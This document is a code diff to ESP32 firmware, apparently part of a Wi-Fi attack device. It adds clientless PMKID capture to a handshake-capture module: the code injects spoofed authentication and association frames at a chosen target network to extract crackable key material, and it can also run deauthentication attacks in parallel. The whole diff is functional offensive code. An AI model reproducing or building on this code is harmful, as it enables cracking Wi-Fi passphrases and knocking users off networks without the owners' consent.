@@ -15,6 +15,8 @@
 #include "modules/wifi/station_scanner.h"
 #include "core/event_bus.h"
 #include "utils/log.h"
+#include "utils/raw_wifi.h"       // softAP raw TX for solicitation frames
+#include "utils/pmkid_solicit.h"  // Pure, unit-tested auth/assoc frame builders (ADR-0138)
 #endif
 
 namespace adversary {
@@ -269,8 +271,15 @@ bool HandshakeCapture::start(const HandshakeCaptureConfig& config) {
     
     lastDeauthTime_ = 0;
     deauthBurstCount_ = 0;
+
+    // Arm clientless PMKID solicitation if requested (config_.solicitPmkid). The injector
+    // fires on the first update() tick (solicitLastMs_ = 0 is always >= one interval ago).
+    solicitAttempts_ = 0;
+    solicitLastMs_ = 0;
+    solicitExhausted_ = false;
+
     setState(HandshakeState::WAITING);
-    
+
     return true;
 }
 
@@ -300,7 +309,23 @@ void HandshakeCapture::update() {
     
 #ifdef ESP32
     uint32_t now = millis();
-    
+
+    // Clientless PMKID (ADR-0138/0139): inject an auth+assoc blind pair to solicit M1. This is
+    // a parallel injector; the promiscuous path records any resulting PMKID keyed on our
+    // spoofed STA MAC and publishes PMKID_CAPTURED, which the screen saves and counts off.
+    if (config_.solicitPmkid) {
+        updateSolicitation(now);
+        // Pure clientless (solicit on, deauth off): the solicitation result is the whole
+        // outcome, so it owns the terminal state and the 4-way grace logic below never runs.
+        if (!config_.autoDeauth) {
+            if (hasPMKID_) setState(HandshakeState::CRACKABLE);
+            else if (solicitExhausted_) setState(HandshakeState::TIMEOUT);
+            return;
+        }
+        // "Both" strategy (ADR-0139): fall through so deauth + the 4-way flow run in parallel;
+        // a solicited PMKID is handled off PMKID_CAPTURED by the screen, not here.
+    }
+
     // Check grace period for minimum valid handshake
     // Wait for remaining messages before declaring CRACKABLE
     if (waitingForComplete_ && (now - graceStartTime_ >= GRACE_PERIOD_MS)) {
@@ -842,6 +867,7 @@ void HandshakeCapture::recordPmkid(const uint8_t* pmkid, const uint8_t* clientMa
     memcpy(pmkid_.staMac, clientMac, 6);
     strncpy(pmkid_.ssid, config_.targetSsid, 32);
     pmkid_.ssid[32] = '\0';
+    pmkid_.channel = config_.channel;  // locked capture channel, for the manifest record
     hasPMKID_ = true;
 
 #ifdef ESP32
@@ -859,5 +885,47 @@ void HandshakeCapture::recordPmkid(const uint8_t* pmkid, const uint8_t* clientMa
     pmkidEvt.payload.handshake.type = 1; // PMKID
     EventBus::getInstance().publish(pmkidEvt);
 }
+
+#ifdef ESP32
+void HandshakeCapture::updateSolicitation(uint32_t now) {
+    // Inject-only (ADR-0139): stop once a PMKID lands (recordPmkid already published
+    // PMKID_CAPTURED) or once the attempt bound is hit. The caller in update() turns these
+    // conditions into the terminal state, so this can run alongside deauth without owning it.
+    if (hasPMKID_ || solicitExhausted_) return;
+    if (solicitAttempts_ >= SOLICIT_MAX_ATTEMPTS) {
+        solicitExhausted_ = true;
+        return;
+    }
+
+    if (now - solicitLastMs_ < SOLICIT_INTERVAL_MS) return;
+    solicitLastMs_ = now;
+    ++solicitAttempts_;  // count before sending so a wedged send still advances the bound
+
+    uint8_t frame[utils::SOLICIT_FRAME_BUF_LEN];
+    const uint8_t* src = utils::defaultSolicitStaMac();
+
+    const uint16_t authLen =
+        utils::buildAuthRequest(frame, sizeof(frame), config_.targetBssid, src);
+    if (authLen == 0) { LOG_E("HS", "Solicit auth build failed"); return; }
+    const TxResult authTx = RawWiFi::transmit(WiFiInterface::AP, frame, authLen, false);
+
+    delay(SOLICIT_INTER_FRAME_MS);  // measured auth->assoc gap that drew M1 (ADR-0138)
+
+    const uint16_t assocLen = utils::buildAssocRequest(frame, sizeof(frame),
+                                                       config_.targetBssid, src,
+                                                       config_.targetSsid);
+    if (assocLen == 0) { LOG_E("HS", "Solicit assoc build failed"); return; }
+    const TxResult assocTx = RawWiFi::transmit(WiFiInterface::AP, frame, assocLen, false);
+
+    if (!authTx.success || !assocTx.success) {
+        LOG_W("HS", "Solicit TX attempt %u/%u: auth ok=%d assoc ok=%d",
+              (unsigned)solicitAttempts_, (unsigned)SOLICIT_MAX_ATTEMPTS,
+              authTx.success, assocTx.success);
+    } else {
+        LOG_I("HS", "Solicit PMKID attempt %u/%u sent",
+              (unsigned)solicitAttempts_, (unsigned)SOLICIT_MAX_ATTEMPTS);
+    }
+}
+#endif
 
 } // namespace adversary
